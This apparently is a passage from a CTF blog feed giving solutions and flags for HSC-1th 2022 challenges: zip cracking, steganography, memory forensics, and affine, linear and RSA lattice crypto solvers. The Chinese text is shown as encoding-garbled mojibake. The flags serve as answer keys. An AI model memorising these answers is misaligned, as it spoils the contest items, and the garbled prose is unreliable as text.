<code>RGVzdDBnM3szNDUxMjA5OC0zMzA5LTc3MTItODg2NS03ODM0NjAyMjE2NDd9</code>ï¼Œbase64è§£ç å³flagï¼š<code>Dest0g3&#123;34512098-3309-7712-8865-783460221647&#125;</code>ã€‚</p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;â€‹    &lt;/p&gt;
&lt;p&gt;é¦–å±ŠDest0g3 520è¿æ–°èµ›æ›´åŠ æ³¨é‡CTFerçš„åŸºç¡€çŸ¥è¯†é¢æŒæ¡ç¨‹åº¦ï¼Œç”±æ˜“åˆ°éš¾ï¼Œé€‚åˆå„å­¦ä¹ é˜¶æ®µé€‰æ‰‹å‚åŠ ï¼Œçº¯èŒæ–°æ°´å‡†ã€‚&lt;/p&gt;
&lt;p&gt;æ¯”èµ›æ—¶é—´ï¼š2022.5.20 10:00 - 5.27 10:00&lt;/p&gt;
&lt;p&gt;é¢˜ç›®åˆ†ç±»ï¼šWebã€Pwnã€Mis</summary>
      
    
    
    
    <category term="match" scheme="https://lazzzaro.github.io/categories/match/"/>
    
    
    <category term="2022èµ›" scheme="https://lazzzaro.github.io/tags/2022%E8%B5%9B/"/>
    
  </entry>
  
  <entry>
    <title>HSC-1th 2022</title>
    <link href="https://lazzzaro.github.io/2022/02/20/match-HSC-1th-2022/"/>
    <id>https://lazzzaro.github.io/2022/02/20/match-HSC-1th-2022/</id>
    <published>2022-02-20T08:28:40.000Z</published>
    <updated>2022-02-21T11:24:05.717Z</updated>
    
    <content type="html"><![CDATA[<p>â€‹    </p><p>æœ¬å±ŠHSC1th 2022æ˜¯ç”±ç¤¾ä¼šæˆ˜é˜Ÿçº¢å®¢çªå‡»é˜Ÿï¼ˆHonker Security Commandoï¼‰ä¸¾åŠã€‚ æœ¬æ¬¡æ¯”èµ›å°†é‡‡ç”¨åœ¨çº¿ç½‘ç»œå®‰å…¨å¤ºæ——æŒ‘æˆ˜èµ›çš„å½¢å¼ï¼Œæ¶µç›–webï¼Œcryptoï¼Œmiscï¼Œreç­‰ä¸»æµæ–¹å‘ï¼Œå¹¶é¢å‘å…¨çƒå¼€æ”¾ã€‚æ¯”èµ›ä¸‰ç”²å¯è·çªå‡»é˜Ÿå‘¨è¾¹ç¤¼å“ã€‚</p><p>Rank: 2</p><hr><h2 id="MISC"><a href="#MISC" class="headerlink" title="MISC"></a>MISC</h2><h3 id="Sign-in"><a href="#Sign-in" class="headerlink" title="Sign-in"></a>Sign-in</h3><blockquote><p>å‰å¾€çº¢å®¢çªå‡»é˜Ÿå…¬ä¼—å·å‘é€â€œHSC2019â€å¹¶ç­¾åˆ°å§ï¼</p></blockquote><p>å…¬ä¼—å·ç­¾åˆ°ã€‚</p><p>flag{HSC_W3LC0M3}</p><p>â€‹    </p><h3 id="DORAEMON"><a href="#DORAEMON" class="headerlink" title="DORAEMON"></a>DORAEMON</h3><p>zipå‹ç¼©åŒ…æ³¨é‡Š <code>å“†å•¦Aæ¢¦æŠŠæ³¡å¥½çš„QRæ”¾è¿›å£è¢‹åï¼Œç”¨å…­ä½æ•°å­—æŠŠè‡ªå·±æ”¾å¥½äº†ã€‚ä½ èƒ½æ‰¾åˆ°å®ƒå—ï¼Ÿ</code>ï¼Œçˆ†ç ´å¾—åˆ°å¯†ç  <code>376852</code>ï¼›</p><p>å¾—åˆ°pngå›¾ç‰‡ç”¨16è¿›åˆ¶ä¿®æ”¹å™¨ä¿®æ”¹é«˜åº¦ï¼Œå¾—åˆ°ç¼ºå°‘ä¸¤ä¸ªå®šä½å›¾æ¡ˆçš„äºŒç»´ç ï¼›</p><p>ä¿®å¤ä¸Šæ–¹ä¸¤ä¸ªå®šä½å›¾æ¡ˆï¼Œæ‰«æå¾—flagï¼šflag{sing1emak3r10v3m!sc}</p><p>â€‹    </p><h3 id="æ±é—»-äººè¨€å¦"><a href="#æ±é—»-äººè¨€å¦" class="headerlink" title="æ±é—»,äººè¨€å¦"></a>æ±é—»,äººè¨€å¦</h3><p>pngæ–‡ä»¶åå­˜åœ¨zipå‹ç¼©åŒ…ï¼Œæå–ååœ¨16è¿›åˆ¶æŸ¥çœ‹å™¨ä¸‹ä¿®å¤å‹ç¼©åŒ…ï¼Œå°†ä¸¤å¤„ <code>4B 50</code> ä¿®æ”¹ä¸º <code>50 4B</code>ï¼›</p><p>å‘ç°zipå‹ç¼©åŒ…åŠ å¯†ï¼Œæ³¨é‡Š <code>qazsedcftrfvgycft6yhntgbnytfvbhyik,.;p</code> ä¸ºé”®ç›˜å¯†ç ï¼Œåœ¨é”®ç›˜ä¸Šç”»å‡ºå…­ä¸ªå­—æ¯ <code>WVALOU</code> ä¸ºè§£å‹å¯†ç ï¼Œå¾—åˆ° <code>flag</code> æ–‡ä»¶ï¼Œ16è¿›åˆ¶æŸ¥çœ‹å‘ç°ä¸ºwavæ–‡ä»¶ç»“æ„ï¼›</p><p>ä½¿ç”¨audacityæŸ¥çœ‹wavæ–‡ä»¶ï¼Œåœ¨é¢‘è°±å›¾å‘ç°flagï¼š<code>flag:e5353bb7b57578bd4da1c898a8e2d767</code></p><p>â€‹    </p><h3 id="PERFORMANCE-ART"><a href="#PERFORMANCE-ART" class="headerlink" title="PERFORMANCE-ART"></a>PERFORMANCE-ART</h3><p>ä¸¤ç§å›¾å½¢æ›¿æ¢å¯†ç çš„æ··åˆï¼Œå…¶ä¸­ä¸€ç§ä¸ºæ ‡å‡†é“¶æ²³å­—æ¯ï¼ˆStandard Galactic Alphabetï¼‰ï¼ŒçŒœæµ‹å¦ä¸€ç§ä»£è¡¨æ•°å­—ï¼Œæ ¹æ®å½¢çŠ¶å’Œå‡ºç°æ¦‚ç‡ï¼ŒçŒœæµ‹å‡ºå‰å‡ ä½ <code>504B0304140000000</code>ï¼Œä¸ºzipå‹ç¼©åŒ…æ–‡ä»¶å¤´ã€‚</p><p>ä¾æ¬¡è¿˜åŸæ‰€æœ‰å­—ç¬¦ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">504b03041400000008004a7e7253148e1e</span><br><span class="line">1e160000001400000006000000756e6b6e6</span><br><span class="line">f778bcaadc888322ec9f30b752df70c</span><br><span class="line">cfae8cca72b30400504b01021f0014000</span><br><span class="line">00008004a7e7253148e1e1e16000000140</span><br><span class="line">000000600240000000000000020000000000</span><br><span class="line">00000756e6b6e6f770a002000000000000</span><br><span class="line">1001800778284ef50dcd7016b04efef5</span><br><span class="line">0dcd701e1b0ef144fdcd701504b05060</span><br><span class="line">000000001000100580000003a0000000000</span><br></pre></td></tr></table></figure><p>ä¿å­˜ä¸ºzipæ–‡ä»¶ï¼Œæ‰“å¼€å¾—åˆ°å†…å®¹ <code>ZmxhZ3tnNUEwIWkyZjF9</code>ï¼Œbase64è§£ç å¾—flagï¼šflag{g5A0!i2f1}</p><p>â€‹    </p><h3 id="WIRESHARK"><a href="#WIRESHARK" class="headerlink" title="WIRESHARK"></a>WIRESHARK</h3><p>zipå‹ç¼©åŒ…åå­˜åœ¨pngå›¾ç‰‡ï¼Œæå–åä½¿ç”¨zstegæŸ¥çœ‹LSBéšå†™ï¼Œåœ¨ <code>b1,rgb,lsb,xy</code> é€šé“éšå†™äº†ä¸€å¼ pngå›¾ç‰‡ï¼Œæå–ï¼š</p><p><code>zsteg -E &quot;b1,rgb,lsb,xy&quot; Untitled1.png &gt; out.png</code></p><p>æ˜¯ä¸€å¼ äºŒç»´ç ï¼Œæ‰«æå¾—åˆ°å†…å®¹ <code>wrsak..iehr370</code>ï¼Œæ …æ è§£å¯† <code>wireshark3.7.0</code>ï¼›</p><p>è§£å‹æœ€å¼€å§‹çš„zipå‹ç¼©åŒ…å¾—åˆ° <code>wireshark</code>ï¼Œ16è¿›åˆ¶æŸ¥çœ‹å‘ç°ä¸ºpdfæ–‡ä»¶ç»“æ„ï¼Œæ–‡ä»¶å¤´è¢«ä¿®æ”¹è¿‡ï¼Œè¿˜åŸä¸º <code>%PDF</code> ï¼ˆ<code>25 50 44 46</code>ï¼‰æ­£å¸¸æ‰“å¼€ï¼Œå†…å®¹æ— æœ‰ç”¨ä¿¡æ¯ï¼ŒçŒœæƒ³ä¸ºPDFéšå†™ï¼›</p><p>ä½¿ç”¨wbStegoå·¥å…·ä»pdfæ–‡ä»¶æˆåŠŸæå–å‡ºflagï¼šflag{Go0dJ0B_y0ufIndLt}</p><p>â€‹    </p><h3 id="PCXP"><a href="#PCXP" class="headerlink" title="PCXP"></a>PCXP</h3><blockquote><p>ç™¾åº¦ç½‘ç›˜<a href="https://pan.baidu.com/s/12q5ULEp_RD62MwbV5eE11A">https://pan.baidu.com/s/12q5ULEp_RD62MwbV5eE11A</a> æå–ç ï¼š1qih </p><p>å¥¶ç‰›å¿«ä¼ <a href="https://cowtransfer.com/s/b76470ddc9e04a">https://cowtransfer.com/s/b76470ddc9e04a</a> </p><p>è“å¥äº‘<a href="https://wwo.lanzouy.com/b030r1x4j">https://wwo.lanzouy.com/b030r1x4j</a> å¯†ç :cvi0 </p><p>æœ¬é¢˜ç›®æ–‡ä»¶PCXP1ä¸PCXP2å‡éœ€è¦ä¸‹è½½ï¼ </p><p>æœ¬é¢˜æ–‡ä»¶ä¸­flag{raw_Imfig3_mLs3}å±äºå¹²æ‰°é¡¹</p></blockquote><p>ä¸¤ä¸ªdumpå†…å­˜çš„rawæ–‡ä»¶ï¼Œç”¨volatilityåˆ†æã€‚</p><p>å…¶ä¸­ä¸€ä¸ªå‘ç° <code>ffflaaagggg.rar</code> æ–‡ä»¶ï¼š</p><p><code>0x000000000227db70      1      0 R--rwd \Device\HarddiskVolume1\Documents and Settings\Administrator\My Documents\My Music\ffflaaagggg.rar</code></p><p>æ ¹æ®æç¤ºï¼Œå¦ä¸€ä¸ªå‘ç° <code>mirror.rar</code> æ–‡ä»¶ï¼š</p><p><code>0x00000000021221e0      1      0 R--rwd \Device\HarddiskVolume1\Documents and Settings\Administrator\My Documents\My Music\mirror.rar</code></p><p>åˆ†åˆ«dumpfilesï¼ŒæŒ‰æ³¨é‡Š<code>key:mirror</code> è§£å‹ <code>mirror.rar</code>ï¼Œæå– <code>mirror.png</code>ï¼Œå‘ç°ååŠéƒ¨åˆ†æœ‰åè½¬çš„pngï¼Œreverseå¤„ç†å¾—åˆ°pngå†…æœ‰å¯†ç  <code>HSC-1th202248H</code> ï¼›</p><p>ç”¨å¯†ç è§£å‹ <code>ffflaaagggg.rar</code>ï¼Œå¾—åˆ° <code>secret.pcap</code>ï¼Œç”¨tsharkæå–USBæµé‡æ— ç»“æœï¼›</p><p>æŸ¥çœ‹16è¿›åˆ¶å‘ç°å­˜åœ¨PNGæ–‡ä»¶å¤´ï¼Œç”¨foremostæå–å‡ºä¸¤å¼ pngå›¾ç‰‡ï¼Œç”»é¢ç›¸åŒå¤§å°ä¸åŒï¼ŒçŒœæµ‹ä¸ºç›²æ°´å°éšå†™ï¼›</p><p>ä½¿ç”¨BlindWaterMarkå·¥å…·æå–ï¼š</p><p><code>python3 bwmforpy3.py decode 00000030.png 00000094.png out.png</code></p><p>å¾—åˆ°flagï¼šflag{Wat3rMarkPtysc}</p><p><img src="/2022/02/20/match-HSC-1th-2022/outx.png" alt="outx"></p><p>â€‹    </p><h2 id="CRYPTO"><a href="#CRYPTO" class="headerlink" title="CRYPTO"></a>CRYPTO</h2><h3 id="Easy-SignIn"><a href="#Easy-SignIn" class="headerlink" title="Easy SignIn"></a>Easy SignIn</h3><blockquote><p>5445705857464579517A4A48546A4A455231645457464243566B5579556C7053546C4A4E524564565646644D515670455130354C5755644F5231685256314A5452315A5552304E57576C5A49525430395054303950513D3D</p></blockquote><p>cipheyä¸€æŠŠæ¢­ï¼Œflagï¼šflag{welc0me_to_my_s1gn_in}</p><p>â€‹    </p><h3 id="AFFINE"><a href="#AFFINE" class="headerlink" title="AFFINE"></a>AFFINE</h3><blockquote><p>flag{md5(result)}</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"></span><br><span class="line">letter=string.ascii_letters+string.digits</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">encrypt</span>(<span class="params">m, c, a, b</span>):</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(m)):</span><br><span class="line">        ch=m[i]</span><br><span class="line">        t=(letter.index(ch) * a + b) % <span class="number">62</span></span><br><span class="line">        c.append(letter[t])</span><br><span class="line">    d = <span class="string">&#x27;&#x27;</span>.join(c)</span><br><span class="line">    <span class="built_in">print</span>(d)</span><br><span class="line"></span><br><span class="line">m = </span><br><span class="line">c = []</span><br><span class="line">a = </span><br><span class="line">b = </span><br><span class="line"></span><br><span class="line"><span class="keyword">assert</span> (<span class="string">&quot;flag&quot;</span> <span class="keyword">in</span> m)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;åŠ å¯†åçš„å¯†æ–‡ä¸ºï¼š&quot;</span>)</span><br><span class="line">Cipher = encrypt(m, c, a, b)</span><br><span class="line">flag = hashlib.md5(<span class="string">&quot;&quot;</span>.join(<span class="built_in">str</span>(m)).encode(<span class="string">&quot;utf8&quot;</span>)).hexdigest()</span><br><span class="line"><span class="comment">#print(flag)</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">åŠ å¯†åçš„å¯†æ–‡ä¸ºï¼š</span></span><br><span class="line"><span class="string">xGJ13kkRK9QDfORQomFOf9NZs9LKVZvGqVIsVO9NOkorv</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br></pre></td></tr></table></figure></blockquote><p>ä»¿å°„å¯†ç åŠ å¯†ï¼Œå…ˆæ ¹æ®å¯†æ–‡å’Œæ˜æ–‡ï¼Œçˆ†ç ´å„ä½ç½®å­˜åœ¨ <code>flag</code> å­—ç¬¦ä¸²æƒ…å†µä¸‹å¯¹åº”çš„ <code>a,b</code> å€¼ï¼Œå†è§£å¯†æ•´ä¸²å¯†æ–‡ã€‚</p><p>çˆ†ç ´æ±‚ <code>a,b</code>ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> string</span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"></span><br><span class="line">letter=string.ascii_letters+string.digits</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">encrypt</span>(<span class="params">m, a, b</span>):</span></span><br><span class="line">    c = []</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(m)):</span><br><span class="line">        ch=m[i]</span><br><span class="line">        t=(letter.index(ch) * a + b) % <span class="number">62</span></span><br><span class="line">        c.append(letter[t])</span><br><span class="line">    d = <span class="string">&#x27;&#x27;</span>.join(c)</span><br><span class="line">    <span class="keyword">return</span> d</span><br><span class="line"></span><br><span class="line">s=<span class="string">&#x27;xGJ13kkRK9QDfORQomFOf9NZs9LKVZvGqVIsVO9NOkorv&#x27;</span></span><br><span class="line"><span class="keyword">for</span> a <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">50</span>):</span><br><span class="line">    <span class="keyword">for</span> b <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">50</span>):</span><br><span class="line">        Cipher = encrypt(<span class="string">&#x27;flag&#x27;</span>, a, b)</span><br><span class="line">        <span class="keyword">for</span> k <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(s)-<span class="number">3</span>):</span><br><span class="line">            <span class="keyword">if</span> Cipher==s[k:k+<span class="number">4</span>]:</span><br><span class="line">                <span class="built_in">print</span>(Cipher,a,b)</span><br><span class="line"><span class="comment"># korv 11 17</span></span><br></pre></td></tr></table></figure><p>è§£å¯†ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">a=<span class="number">11</span></span><br><span class="line">b=<span class="number">17</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">decrypt</span>(<span class="params">m, a, b</span>):</span></span><br><span class="line">    <span class="keyword">import</span> gmpy2</span><br><span class="line">    c = []</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(m)):</span><br><span class="line">        ch=m[i]</span><br><span class="line">        t=((letter.index(ch) - b) * gmpy2.invert(a,<span class="number">62</span>)) % <span class="number">62</span></span><br><span class="line">        c.append(letter[t])</span><br><span class="line">    d = <span class="string">&#x27;&#x27;</span>.join(c)</span><br><span class="line">    <span class="keyword">return</span> d</span><br><span class="line"></span><br><span class="line">m=decrypt(s, a, b)</span><br><span class="line"><span class="built_in">print</span>(m)</span><br><span class="line">flag = hashlib.md5(<span class="string">&quot;&quot;</span>.join(<span class="built_in">str</span>(m)).encode(<span class="string">&quot;utf8&quot;</span>)).hexdigest()</span><br><span class="line"><span class="built_in">print</span>(flag)</span><br><span class="line"><span class="comment"># Oh62Affine1sSti1lN0tSecureEnoughToProtectflag</span></span><br><span class="line"><span class="comment"># 2b9b99caae1cc49e5b5aacbc8cc22350</span></span><br></pre></td></tr></table></figure><p>flagï¼šflag{2b9b99caae1cc49e5b5aacbc8cc22350}</p><p>â€‹    </p><h3 id="LINE-GENERATION-TEST"><a href="#LINE-GENERATION-TEST" class="headerlink" title="LINE-GENERATION-TEST"></a>LINE-GENERATION-TEST</h3><blockquote><p>â€œSorry, Tazmi, I canâ€™t hold you in my arms anymoreâ€ Who said that? flag{md5(result)}</p><p><img src="/2022/02/20/match-HSC-1th-2022/task.png" alt="task" style="zoom:80%;"></p></blockquote><p>æ ¹æ® <code>enc</code> ç»“æœï¼ŒçŒœæµ‹ä¸º $\mod 26$ ä¸‹çš„çŸ©é˜µè¿ç®—ï¼Œå€¼å¯¹åº”å­—æ¯åºï¼Œç®€å•ç”¨z3è§£ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> z3 <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">f=[Int(<span class="string">f&#x27;f<span class="subst">&#123;i&#125;</span>&#x27;</span>) <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">5</span>)]</span><br><span class="line">out=[<span class="number">9</span>,<span class="number">23</span>,<span class="number">0</span>,<span class="number">13</span>,<span class="number">19</span>]</span><br><span class="line"></span><br><span class="line">ss=Solver()</span><br><span class="line"></span><br><span class="line">ss.add((f[<span class="number">0</span>]+f[<span class="number">1</span>])%<span class="number">26</span>==out[<span class="number">0</span>])</span><br><span class="line">ss.add((f[<span class="number">1</span>]+f[<span class="number">4</span>])%<span class="number">26</span>==out[<span class="number">1</span>])</span><br><span class="line">ss.add((f[<span class="number">2</span>]+f[<span class="number">3</span>]+f[<span class="number">4</span>])%<span class="number">26</span>==out[<span class="number">2</span>])</span><br><span class="line">ss.add((f[<span class="number">1</span>]+f[<span class="number">2</span>]+f[<span class="number">3</span>])%<span class="number">26</span>==out[<span class="number">3</span>])</span><br><span class="line">ss.add((f[<span class="number">3</span>])%<span class="number">26</span>==out[<span class="number">4</span>])</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">5</span>):</span><br><span class="line">    ss.add(f[i]&gt;=<span class="number">0</span>)</span><br><span class="line">    ss.add(f[i]&lt;<span class="number">26</span>)</span><br><span class="line"></span><br><span class="line">ss.check()</span><br><span class="line">m=ss.model()</span><br><span class="line"><span class="built_in">print</span>(m)</span><br><span class="line">res=<span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">5</span>):</span><br><span class="line">    res+=<span class="built_in">chr</span>(m[f[i]].as_long()+<span class="built_in">ord</span>(<span class="string">&#x27;A&#x27;</span>))</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(res)</span><br><span class="line"><span class="comment"># RSCTF</span></span><br></pre></td></tr></table></figure><p>MD5ï¼Œå¾—flagï¼šflag{e4163deba70420c58acb87abcab34141}</p><p>â€‹    </p><h3 id="LATTICE"><a href="#LATTICE" class="headerlink" title="LATTICE"></a>LATTICE</h3><blockquote><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> gmpy2 <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">flag = <span class="string">b&#x27;flag&#123;******&#125;&#x27;</span>.strip(<span class="string">b&#x27;flag&#123;&#x27;</span>).strip(<span class="string">b&#x27;&#125;&#x27;</span>)</span><br><span class="line">_length = <span class="built_in">len</span>(flag)</span><br><span class="line">f1, f2, f3 = [flag[_*_length//<span class="number">3</span>:(_+<span class="number">1</span>)*_length//<span class="number">3</span>] <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">3</span>)]</span><br><span class="line"></span><br><span class="line">e = <span class="number">0x10001</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># part1</span></span><br><span class="line">m1 = bytes_to_long(f1)</span><br><span class="line">p1 = getPrime(<span class="number">1024</span>)</span><br><span class="line">q1 = getPrime(<span class="number">1024</span>)</span><br><span class="line">n1 = p1 * q1</span><br><span class="line">phi1 = n1 - p1 - q1 + <span class="number">1</span></span><br><span class="line">c1 = <span class="built_in">pow</span>(m1, e, n1)</span><br><span class="line">e1 = invert(getPrime(<span class="number">730</span>), phi1)</span><br><span class="line">e2 = invert(getPrime(<span class="number">730</span>), phi1)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;c1=<span class="subst">&#123;c1&#125;</span>&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;n1=<span class="subst">&#123;n1&#125;</span>&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;e1, e2=<span class="subst">&#123;e1&#125;</span>, <span class="subst">&#123;e2&#125;</span>&quot;</span>)</span><br><span class="line"><span class="comment"># c1=...</span></span><br><span class="line"><span class="comment"># n1=...</span></span><br><span class="line"><span class="comment"># e1, e2=...</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># part2</span></span><br><span class="line">m2 = bytes_to_long(f2)</span><br><span class="line">p2 = getPrime(<span class="number">1024</span>)</span><br><span class="line">q2 = getPrime(<span class="number">1024</span>)</span><br><span class="line">n2 = p2 * q2</span><br><span class="line">phi2 = n2 - p2 - q2 + <span class="number">1</span></span><br><span class="line">c2 = <span class="built_in">pow</span>(m2, e, n2)</span><br><span class="line">e1 = invert(getPrime(<span class="number">818</span>), phi2)</span><br><span class="line">e2 = invert(getPrime(<span class="number">818</span>), phi2)</span><br><span class="line">e3 = invert(getPrime(<span class="number">818</span>), phi2)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;c2=<span class="subst">&#123;c2&#125;</span>&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;n2=<span class="subst">&#123;n2&#125;</span>&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;e1, e2, e3=<span class="subst">&#123;e1&#125;</span>, <span class="subst">&#123;e2&#125;</span>, <span class="subst">&#123;e3&#125;</span>&quot;</span>)</span><br><span class="line"><span class="comment"># c2=...</span></span><br><span class="line"><span class="comment"># n2=...</span></span><br><span class="line"><span class="comment"># e1, e2, e3=...</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># part3</span></span><br><span class="line">m3 = bytes_to_long(f3)</span><br><span class="line">nl = []</span><br><span class="line">cl = []</span><br><span class="line">el = []</span><br><span class="line">d = getPrime(<span class="number">890</span>)</span><br><span class="line"><span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">7</span>):</span><br><span class="line">    p3 = getPrime(<span class="number">1024</span>)</span><br><span class="line">    q3 = getPrime(<span class="number">1024</span>)</span><br><span class="line">    n3 = p3 * q3</span><br><span class="line">    phi3 = n3 - p3 - q3 + <span class="number">1</span></span><br><span class="line">    e3 = invert(d, phi3)</span><br><span class="line">    c3 = <span class="built_in">pow</span>(m3, e3, n3)</span><br><span class="line">    nl.append(n3)</span><br><span class="line">    el.append(<span class="built_in">int</span>(e3))</span><br><span class="line">    cl.append(<span class="built_in">int</span>(c3))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;nl=<span class="subst">&#123;nl&#125;</span>&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;el=<span class="subst">&#123;el&#125;</span>&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;cl=<span class="subst">&#123;cl&#125;</span>&quot;</span>)</span><br><span class="line"><span class="comment"># nl=[...]</span></span><br><span class="line"><span class="comment"># el=[...]</span></span><br><span class="line"><span class="comment"># cl=[...]</span></span><br></pre></td></tr></table></figure></blockquote><p>RSAçš„ä¸¤ç§æ¶‰åŠæ ¼çš„LLLç®—æ³•çš„æ”»å‡»æƒ…å½¢ï¼ˆå¤šç»„ä½è§£å¯†æŒ‡æ•°æ”»å‡»+å…±ç§é’¥æŒ‡æ•°æ”»å‡»ï¼‰ã€‚</p><p>Part1ï¼Œ2ç»„ $e$ çš„ä½è§£å¯†æŒ‡æ•°æ”»å‡»ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span 